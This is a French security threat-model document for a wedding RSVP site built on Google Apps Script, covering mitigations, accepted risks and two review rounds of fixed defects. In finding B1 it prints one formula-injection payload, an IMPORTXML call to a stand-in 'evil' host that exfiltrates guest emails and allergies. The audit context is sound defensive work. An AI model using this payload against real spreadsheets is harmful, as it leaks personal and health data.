# SECURITE — modèle de menaces et parades

État au 2026-10-19, fin de Phase 4, **après deux revues indépendantes**.

> Une revue de sécurité menée par un relecteur qui n'avait pas écrit le code a trouvé
> **4 points bloquants et 7 points à corriger**, tous réels, tous corrigés depuis. Le détail
> figure en §7. Deux lignes de ce document étaient fausses avant cette revue : M10 affirmait
> que « toute saisie libre » était assainie, alors que le chemin du `Journal` ne l'était pas,
> et M5 justifiait le plafond anti-sondage par un raisonnement inexact.

Légende : ✅ implémentée et testée · 🔶 implémentée, test en attente d'un environnement réel · ⏳ phase ultérieure.

## 1. Ce que l'on protège

| Bien | Pourquoi il compte |
|---|---|
| Les réponses d'un foyer (présences, **allergies**, **régimes**, âge des enfants) | Données personnelles, dont des **données de santé** (C14, RGPD) |
| La liste des invités et leurs adresses | Données personnelles, révèle aussi la composition du cercle privé des mariés |
| La capacité d'envoi de mail du compte Google de Harry | Ressource rare (~100/jour, C8) ; épuisée, plus personne ne peut se connecter |
| L'intégrité du Sheet | C'est la seule base ; une corruption se paie en coups de téléphone aux invités |

## 2. Ce contre quoi on ne protège pas

Dit explicitement, pour que personne ne s'illusionne :

- **Un invité légitime qui ment** (déclare 3 présents puis vient à 5). Hors périmètre.
- **Un invité qui transfère son mail de code** à un tiers. Le code vaut porte d'entrée, comme un carton d'invitation.
- **Google**. Toutes les données sont chez Google, par construction.
- **Une attaque ciblée par un adversaire déterminé** disposant déjà de la liste des adresses d'invités.
- **Le déni de service distribué**. Apps Script ne voit pas l'adresse IP (C6) ; on ne peut limiter que par email, par code et par quota global. Un attaquant qui connaît beaucoup d'adresses d'invités peut épuiser le quota du jour. Parade : le plafond protège le compte, et `Journal` trace l'incident pour réagir.

## 3. Modèle de menaces

| # | Menace | Parade | Où | État |
|---|---|---|---|---|
| M1 | **Force brute sur le code** à 6 chiffres | Code aléatoire issu d'un UUID v4 (D19), TTL 10 min, **5 essais maximum par code** décomptés **sous verrou**, code effacé dès qu'il est accepté ou épuisé | `Securite.gs` · `consommerCode_` | ✅ |
| M2 | **Mail bombing** d'une adresse d'invité | 5 demandes maximum par adresse et par heure, compteur **persistant** (C7), fenêtre glissante, lecture-écriture **sous verrou** pour résister aux requêtes concurrentes | `Securite.gs` · `demandeAutorisee_` | ✅ |
| M3 | **Épuisement du quota mail global** | Créneau d'envoi **réservé sous verrou avant** l'envoi (et rendu si l'envoi échoue), plafond applicatif `PLAFOND_MAILS_JOUR` **et** contrôle de `getRemainingDailyQuota()` ; au-delà, `SERVICE_INDISPONIBLE` et alerte dans `Journal` | `Securite.gs` · `reserverEnvoiMail_` | ✅ |
| M4 | **Robots sur le formulaire email** | Champ caché « honeypot » : s'il est rempli, la réponse est indiscernable d'un succès et **aucun mail ne part** | `Code.gs` · `actionRequestCode_` | ✅ |
| M5 | **Énumération des invités** | Message explicite `EMAIL_INCONNU` assumé (D04). Plafond **global** de 50 sondages d'adresses inconnues par heure, porté par **une seule clé** et placé sur la seule branche « adresse inconnue » — il ne peut donc jamais bloquer un invité légitime | `Code.gs` · `actionRequestCode_` | ✅ |
| M6 | **Vol ou rejeu de session** | Token = UUID v4, TTL 6 h, stocké **haché** côté serveur (D18), en `sessionStorage` côté client, invalidé au logout. Donne accès au seul foyer associé | `Securite.gs` · `ouvrirSession_` | ✅ |
| M7 | **Accès aux données d'un autre foyer** | `foyerDeSession_(token)` est la **seule** source d'un `foyer_id`. Aucune action ne lit un identifiant venu du client — vérifié par test en injectant `foyer_id`, `foyerId` et `foyer` dans la requête | `Code.gs`, `Securite.gs` | ✅ |
| M8 | **Le client réécrit des données du Sheet** (renomme un invité, se déclare enfant, se déclare accompagnant) | Les noms sont rapprochés de l'onglet `Invites` et **réécrits depuis le Sheet** ; `type_personne` et `est_accompagnant` sont imposés par le serveur | `Code.gs` · `actionSubmitRsvp_` | ✅ |
| M9 | **XSS** (noms venant du Sheet, saisies d'invités) | Front : `textContent` uniquement, jamais `innerHTML` avec des données. Mail HTML : `echapperHtml_` sur toute valeur insérée. CSP par balise `<meta>` | `Mail.gs` · `echapperHtml_` ; front | ✅ mail · ✅ front (analyse statique : zéro `innerHTML`, zéro style en ligne) · ⏳ à confirmer en navigateur réel |
| M10 | **Injection de formules dans le Sheet** | `assainirTexte_` sur **les trois seuls points d'écriture** de données venant du client : `Reponses`, `Historique` et **`Journal`** (ce dernier était le trou, voir §7 B1). Retrait des caractères de contrôle, troncature, apostrophe devant `=` `+` `-` `@`, y compris masqués par des espaces. Colonnes du `Journal` forcées en format texte en défense en profondeur | `Securite.gs`, `Sheet.gs` · `journaliser_` | ✅ |
| M11 | **Écritures concurrentes / doublons** | `LockService` sur toute écriture, réécriture complète et idempotente des lignes du foyer, `Historique` en ajout seul | `Sheet.gs` · `ecrireReponsesFoyer_` | ✅ |
| M12 | **Fuite de données par le dépôt public** | `.gitignore` strict, adresse de test dans la Script Property `EMAIL_TEST`, **adresse de contact servie par l'API depuis `Config`** et non écrite dans le code (corrigé en P4, voir §8 B-2). Aucune adresse réelle dans l'état actuel du dépôt | dépôt | 🔶 l'état actuel est sain ; **l'historique git contient encore une adresse Gmail réelle**, à purger avant le premier `git push` |
| M13 | **Partage accidentel du Sheet** | Jamais de partage par lien ; accès nominatif aux mariés. Rappelé dans `INSTALLATION.md` et à venir dans `GUIDE_MARIES.md` | procédure | 🔶 |
| M14 | **Journal trop bavard** | Aucun code, token, régime, allergie ni commentaire dans `Journal` — vérifié par test. Et depuis P4, **aucun chemin non authentifié ne peut y écrire sans plafond** : `logout` ne trace que s'il a fermé une session, le piège à robots passe par le budget horaire global, et une `DATE_LIMITE` illisible n'alerte qu'une fois par jour (§8 A-1) | `Sheet.gs` · `journaliser_` ; `Code.gs` | ✅ |
| M15 | **Fuite technique dans une réponse d'erreur** | Toute exception inattendue devient `ERREUR_SERVEUR` ; la trace reste dans le journal d'exécution Google. Vérifié en cassant volontairement le classeur | `Code.gs` · `doPost` | ✅ |
| M16 | **Requête malformée ou volumineuse** | Corps plafonné à 20 000 caractères, JSON validé, action cherchée avec `hasOwnProperty` (une action nommée `constructor` ou `__proto__` n'est pas routable) | `Code.gs` · `doPost` | ✅ |
| M17 | **Dépassement de `places_max`** | Nombre de présents et nombre d'accompagnants contrôlés côté serveur, pas seulement dans l'interface | `Code.gs` · `actionSubmitRsvp_` | ✅ |
| M18 | **Réponses après la date limite** | `DATE_LIMITE` lue dans `Config` à chaque soumission ; la consultation reste possible, l'écriture non | `Code.gs` · `reponsesOuvertes_` | ✅ |
| M19 | **Saturation des magasins persistants** | Aucune clé de `PropertiesService` n'est créée pour une adresse inconnue ; balayage en une seule écriture au lieu de N suppressions ; échec propre en `SERVICE_INDISPONIBLE` si le magasin sature. `Historique` et `Reponses` agrandissent la feuille avant d'écrire, et `verifierDonnees()` alerte à 80 % de remplissage | `Securite.gs`, `Sheet.gs` | ✅ |
| M20 | **Journal alimentable sans limite** | Les requêtes rejetées sur la **forme** (adresse ou code mal formés) n'écrivent aucune ligne ; seules les adresses bien formées laissent une trace | `Code.gs` | ✅ |

## 4. Décisions de sécurité et risques acceptés

| # | Décision | Risque accepté |
|---|---|---|
| D04 | Message `EMAIL_INCONNU` explicite plutôt qu'une réponse uniforme | Un attaquant qui possède déjà une adresse peut confirmer qu'elle est invitée. Jugé faible devant le coût en expérience utilisateur. |
| D08 | Plusieurs adresses par foyer | Le plafond horaire est **par adresse** : un foyer à 3 adresses peut recevoir 3 × 5 codes par heure. Le plafond journalier global reste la vraie protection. |
| D14 | Adresse git personnelle publique | Collecte automatisée de l'adresse de Harry sur GitHub. Sans effet sur les données des invités. |
| D15 | Portée OAuth `spreadsheets` au lieu de `spreadsheets.currentonly` | Le script peut techniquement accéder aux autres classeurs du compte. Il n'en ouvre qu'un seul, et il appartient à Harry. |
| — | Codes à 6 chiffres | 1 chance sur 200 000 de deviner en 5 essais, sur une fenêtre de 10 minutes. Suffisant pour l'enjeu. |
| — | `CODE_EXPIRE` et `CODE_INVALIDE` distinguables | Révèle qu'une demande de code est en cours pour une adresse donnée. Cohérent avec D04, impact négligeable. |
| — | Plafond de sondage de 50 adresses inconnues par heure | Un robot peut provoquer 50 lectures du Sheet par heure. Borné, sans effet sur les invités, et aucune donnée n'est exposée. |

## 5. Ce qui reste à vérifier dans un environnement réel

Ces points ne peuvent pas être prouvés hors de Google :

- [ ] Concurrence réelle : deux onglets qui soumettent simultanément (le `LockService` simulé répond toujours oui).
- [ ] Délivrabilité des mails : Gmail, Outlook, iCloud, et absence de classement en spam (C15, R01).
- [ ] Comportement sous démarrage à froid de 1 à 4 s (C5).
- [ ] Taille réelle de `PropertiesService` après plusieurs centaines de demandes.
- [ ] CSP du front sans violation en usage normal (P3).

## 6. Gate SEC

| Point de la gate (§3.2 du brief) | État |
|---|---|
| Chaque menace a une parade implémentée **et testée** | ✅ backend (182 contrôles) · 🔶 front : structure vérifiée et 66 contrôles automatisés, mais jamais ouvert dans un navigateur réel |
| Aucune donnée personnelle ni adresse réelle dans le dépôt (`git log -p` vérifié) | 🔶 **état actuel ✅ depuis P4** ; l'historique contient encore une adresse Gmail réelle (2 commits), à purger avant publication — procédure en `INSTALLATION.md` §5.1 |
| Aucune action ne fait confiance à un identifiant fourni par le client | ✅ confirmé ligne à ligne par la revue croisée P4 |
| La CSP est en place et ne casse pas le site | 🔶 analyse statique concluante (zéro style/script en ligne, les **deux** domaines Apps Script sont dans `connect-src`) ; à confirmer en console réelle |
| Les erreurs renvoyées ne contiennent ni trace technique ni contenu interne | ✅ vérifié de l'extérieur par `verifier-deploiement.sh` |

> **Note sur `frame-ancestors`** : la directive est présente mais **inerte**, car les
> navigateurs l'ignorent dans une CSP posée par balise `<meta>`. Sans conséquence ici :
> il n'y a aucun cookie, et le token vit en `sessionStorage`. On la garde pour le jour
> où le site serait servi derrière un hébergeur capable de poser des en-têtes HTTP.


## 7. Revue indépendante du 2026-10-18 — défauts trouvés et corrigés

Revue menée par un relecteur qui n'avait pas écrit le code, sur la base du §3.2 du brief.
Les 122 tests existants n'en couvraient aucun : ils validaient le comportement prévu, pas
les chemins oubliés. **39 tests de régression** ont été ajoutés, au moins un par défaut.

> Une exception, relevée par la revue croisée de Phase 4 : **A6 n'a pas reçu de test
> dédié**, et sa correction était effectivement incomplète. Voir §8, constat A-1.

### Bloquants

| # | Défaut | Pourquoi c'était grave | Correction |
|---|---|---|---|
| **B1** | `journaliser_` écrivait l'adresse reçue **sans assainissement**, et la colonne `email` du `Journal` n'était pas en format texte | Un `curl` **anonyme** avec `{"email":"=IMPORTXML(\"https://evil/?d=\"&JOIN(\",\",Foyers!B2:B200),\"//a\")"}` posait une vraie formule, évaluée avec les droits du propriétaire, exfiltrant les adresses des invités et les allergies. Aucun code ni token requis | Les quatre valeurs passent par `assainirTexte_` ; `email`, `action` et `resultat` ajoutées aux colonnes en format texte |
| **B2** | Les compteurs anti-abus et le quota mail faisaient lire-modifier-écrire **sans verrou** | Apps Script autorise ~30 exécutions simultanées : 30 `requestCode` parallèles lisaient toutes « 0 demande » et partaient toutes. 30 mails, compteur à 1. Mail bombing effectif et quota du jour épuisé en minutes | `avecVerrou_` sur les compteurs ; le créneau d'envoi est **réservé avant** l'envoi et rendu si l'envoi échoue |
| **B3** | Chaque adresse inventée créait une clé persistante | ~10 000 requêtes saturaient `PropertiesService` (500 Ko). Au-delà, `setProperty` levait et **plus aucun invité ne pouvait se connecter** — état persistant, réparable seulement à la main | Aucune clé par adresse inconnue : un **unique** compteur global horaire, placé sur la seule branche « inconnue ». Balayage en une écriture. Saturation convertie en `SERVICE_INDISPONIBLE` |
| **B4** | `getRange(...).setValues()` n'agrandit pas la feuille, contrairement à `appendRow` | `Historique` est en ajout seul : à la 1 000ᵉ ligne — atteinte avant la date limite — chaque soumission écrivait `Reponses` puis **échouait** sur l'archivage. Réponse enregistrée, aucun récapitulatif, écriture non atomique | `assurerLignes_()` avant chaque écriture, dans `Reponses` et `Historique` |

### À corriger

| # | Défaut | Correction |
|---|---|---|
| **A1** | Les clés d'appariement des noms étaient calculées différemment côté `Invites` (nom brut) et côté client (nom assaini) : une **espace insécable** ou un double espace dans le Sheet rendait le foyer **définitivement incapable de répondre** | Fonction `cleNom_()` unique, appliquée des deux côtés ; `verifierDonnees()` signale désormais ces noms en **erreur** |
| **A2** | `parNom` était un objet littéral : une personne nommée `constructor` échappait au plafond d'accompagnants et écrivait une ligne vide | `Object.create(null)`, et `hasOwnProperty` pour la construction des lignes |
| **A3** | `presence` : toute valeur non reconnue (`"1"`, `"yes"`, `"oui "`) basculait **silencieusement en absent** | Liste blanche stricte, `DONNEES_INVALIDES` sinon |
| **A4** | Le compteur d'essais d'un code n'était pas atomique | `consommerCode_` sous verrou |
| **A5** | `lireOnglet_` ignore les lignes vides, mais l'effacement portait sur ce nombre : une ligne vidée à la main par les mariés laissait une **ligne orpheline en double** après la soumission suivante | Effacement d'après `getLastRow()` réel |
| **A6** | Toute requête malformée écrivait une ligne de `Journal`, sans limite | Les rejets sur la forme n'écrivent plus rien. `verifyCode` contrôle aussi le format de l'adresse — trou supplémentaire trouvé en écrivant le test de régression |
| **A7** | Remplir `EXPEDITEUR_ADRESSE` dans `Config` aurait fait échouer **chaque connexion** en `ERREUR_SERVEUR`, la portée `gmail.send` n'étant pas déclarée | Repli sur `MailApp` avec alerte au `Journal` ; `verifierDonnees()` le signale en erreur |

### Régression introduite pendant la correction, puis corrigée

La première version du correctif B3 plaçait le plafond de sondage **avant** la recherche du
foyer. Le test de régression a immédiatement montré que 50 sondages bloquaient alors aussi
les invités légitimes pendant une heure — un déni de service, précisément ce que B3 cherchait
à éviter. Le contrôle a été déplacé sur la seule branche « adresse inconnue ».

### Non retenu

- **Suggestion U+200B et caractères invisibles hors `\s`** : vérifié, ce n'est pas un
  contournement de la neutralisation de formules. Traité en amont : `verifierDonnees()`
  signale ces caractères dans les noms de `Invites`, là où ils font des dégâts.
- **Décalage minuit Paris / Pacifique** entre le compteur applicatif et le quota Gmail :
  réel mais rattrapé par `getRemainingDailyQuota()`. Noté, pas corrigé.


## 8. Revue croisée du 2026-10-19 (Phase 4) — défauts trouvés et corrigés

Revue menée par un relecteur indépendant sur les **quatre rôles** du brief (CP, SEC, DES,
DATA), portant sur les incohérences **entre** les éléments : code ↔ code, code ↔ documents,
front ↔ contrat d'API. Les constats de §7 n'ont pas été re-signalés, sauf là où la
correction s'est révélée **incomplète** — ce fut le cas d'A6.

Verdict d'entrée : **aucune gate franchie**, 4 bloquants, 9 points à corriger, 10 suggestions.

### Bloquants

| # | Défaut | Correction |
|---|---|---|
| **B-1** | La procédure de **Phase 5 était un titre vide** — alors que la gate CP exige que les actions manuelles soient listées, et que c'était la phase suivante | `INSTALLATION.md` §5.1 à §5.7 écrite : purge de l'historique, contenu réel, activation de Pages, `URL_SITE`, test public, envoi des faire-part, surveillance des 48 h |
| **B-2** | **Adresse Gmail personnelle en clair** dans `config.js`, donc dans un dépôt public, bientôt servie sur une page publique et affichée dans trois messages d'erreur — alors que `SECURITE.md`, `README.md` et `CLAUDE.md` affirmaient le contraire | L'adresse **quitte le dépôt** : elle est servie par l'API (`ping` et `getRsvp`) depuis `Config!CONTACT_MARIES`. Les mariés peuvent la changer sans redéployer. Les affirmations fausses sont corrigées. **Reste à faire par Harry : purger les 2 commits de l'historique avant le premier `git push`** |
| **B-3** | **Aucune vérification manuelle faite** : mail réel, concurrence, quotas, mobile, clavier, lecteur d'écran, CSP en console | Hors de portée d'un agent. C'est la session de recette de Harry, `RECETTE.md` §3bis et §4 |
| **B-4** | Après la date limite, le bouton d'entrée était **masqué** : les écrans « formulaire en lecture seule » et « réponses closes » devenaient **inatteignables**. Une invitée ne pouvait plus relire l'allergie déclarée pour son enfant — alors que le code pour le lui montrer existait et fonctionnait | Le bouton reste affiché et devient « Consulter ma réponse ». Le serveur refuse déjà l'écriture, le formulaire est déjà désactivé. Le test front encodait le défaut : il a été inversé |

### À corriger

| # | Défaut | Correction |
|---|---|---|
| **A-1** | **La correction A6 était incomplète.** Trois chemins non authentifiés et sans aucun plafond écrivaient dans `Journal` : `logout` traçait inconditionnellement avant toute validation ; le piège à robots traçait avant le contrôle de forme ; et surtout `reponsesOuvertes_` alertait à **chaque appel de `ping`**, donc à chaque chargement de page par chaque visiteur. Une `DATE_LIMITE` saisie « 30/04/2027 » — le réflexe français — remplissait le classeur en un après-midi | `fermerSession_` renvoie désormais si une session existait, et `logout` ne trace que dans ce cas ; le piège passe après le contrôle de forme et partage le budget horaire global ; nouvelle fonction `alerterUneFoisParJour_`, dont les clés sont balayées comme les autres compteurs |
| **A-2** | **Le code se contredisait** : `submitRsvp` retirait l'apostrophe de neutralisation du récapitulatif, `getRsvp` ne la retirait pas. Un invité ayant écrit « -sans lactose » voyait son texte correct à l'envoi, puis « '-sans lactose » pré-rempli le lendemain | Une seule fonction partagée, `sansApostrophe_`, appelée par les deux chemins. Le Sheet reste protégé |
| **A-3** | `evenements` était renvoyé par le serveur et **jamais lu** : le front gardait ses propres libellés en dur. Ajouter un quatrième moment n'aurait rien changé à l'affichage, sans aucune erreur | Le front lit `evenements`. Une seule source de vérité pour les noms ; la grammaire de la phrase reste côté front |
| **A-4** | Une présence oubliée n'avait **aucun retour visuel** : `aria-invalid` était posé sur un bouton radio en `opacity: 0`, et `:focus-visible` ne se déclenche pas après un focus programmatique consécutif à un appui tactile | Règles CSS sur le `<span>` visible, et contour d'erreur sur `:focus` |
| **A-5** | `TROP_DE_TENTATIVES` couvre deux situations aux remèdes **opposés**. Sur l'écran code, le message conseillait d'attendre une heure alors qu'il suffisait de demander un nouveau code | Message distinct sur cet écran. Le contrat d'API est inchangé |
| **A-6** | Le message d'erreur du formulaire était dans la dernière carte : il n'était **jamais à l'écran en même temps** que le champ fautif, vers lequel le focus faisait défiler | Message d'erreur propre à chaque personne, relié par `aria-describedby`, et défilement centré sur lui |
| **A-7** | `ecrireReponsesFoyer_` effaçait **tout** `Reponses` avant de le réécrire : une interruption entre les deux (erreur transitoire de l'API Sheets, ou les 6 minutes de C9) laissait l'onglet entièrement vide, **pour tous les foyers** | On écrit d'abord, on efface le surplus ensuite. Même coût, sans la fenêtre destructrice. Un test observe l'ordre réel des opérations |
| **A-8** | Les formules « effectifs par service » de `Synthese` étaient bornées à 2 000 lignes alors que les comptages voisins étaient en colonnes ouvertes : au-delà, les totaux auraient divergé **sans aucun signal** | Plages ouvertes, comme les autres |
| **A-9** | Documents d'état en retard sur le code : `README` annonçait « Phase 0 terminée », `SECURITE` était daté de P2, les comptages de tests étaient faux (36 annoncés, 39 réels) | Corrigés. Le comptage est désormais relevé sur l'exécution réelle de la suite |

### Suggestions retenues

- `balayerCompteurs_` s'exécutait **hors verrou** et réécrivait un instantané : il pouvait
  effacer l'incrément d'une requête concurrente. Passé sous `tryLock`, sans forcer.
- `verifierDonnees()` détectait les doublons de noms avec `toLowerCase()`, alors que
  l'appariement à l'exécution utilise `cleNom_()`. Deux « José » saisis l'un au clavier
  (NFC) et l'autre collé depuis macOS (NFD) passaient la vérification, puis rendaient le
  foyer **définitivement incapable de répondre**. Même clé des deux côtés désormais.
- Un enfant déclaré absent puis repassé présent retombait sur « aucun régime » au lieu de
  « menu enfant » : le traiteur aurait compté un menu adulte.
- « Il vous reste 2 places » alors que l'interface n'offre qu'**un** accompagnant.
- Le focus initial sur le titre rendait le lien d'évitement inatteignable au clavier.
- Le pied de page disait « Écrivez-nous » **sans donner d'adresse**.
- `loading="lazy"` sur les photos : 628 Ko étaient chargés au premier affichage.
- `.nojekyll` ajouté : sans lui, GitHub Pages rendrait `README.md` et `docs/*.md` en HTML.

### Non corrigé, assumé

- **`maquette.html` servie publiquement** : ce n'est pas un problème de sécurité (dépôt
  public par construction, `noindex`, adresses `@example.com`, aucune API câblée), mais un
  risque de **confusion** — un invité qui tomberait dessus verrait un faux formulaire.
  Un bandeau d'avertissement a été ajouté ; la supprimer avant la mise en ligne reste
  l'option la plus sûre, c'est une décision de Harry.
- **Volumétrie** : `etatFoyer_` déclenche 4 lectures d'onglets, `submitRsvp` 4 à 5, dont
  une **dans** le verrou. Le brief C9 demande une lecture unique par requête. À 150
  invités ce n'est pas bloquant ; si la Phase 5 révèle des lenteurs, mettre `Config` en
  cache 60 s divise les lectures par deux sans risque.
